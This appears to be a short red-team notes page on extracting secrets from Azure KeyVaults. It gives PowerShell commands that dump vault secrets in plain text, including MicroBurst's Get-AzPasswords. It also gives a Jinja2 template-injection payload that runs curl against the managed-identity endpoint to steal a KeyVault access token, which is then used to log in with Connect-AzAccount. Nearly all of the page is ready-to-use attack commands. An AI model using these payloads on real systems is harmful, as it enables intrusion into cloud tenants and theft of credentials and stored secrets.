# KeyVault

KeyVaults contain sensitive information and oftentimes enterprise applications and/or users are allowed to access them.

You can access secrets within KeyVaults through [[Az#Resources]]:

~~~ powershell
Get-AzKeyVaultSecret -VaultName ResearchKeyVault
Get-AzKeyVaultSecret -VaultName ResearchKeyVault -Name Reader -AsPlainText

# Or use Microburst -> Get-AzPassords
Get-AzPasswords
~~~

Please note that you need a special KeyVault access token (and not the normal access token) to retrieve secrets:

~~~ powershell
# this will be the keyvaulttoken
{{config.__class__.__init__.__globals__['os'].popen('curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER').read()}}

Connect-AzAccount -AccessToken $token -AccountId $accountId -KeyVaultAccessToken $keyvaulttoken
~~~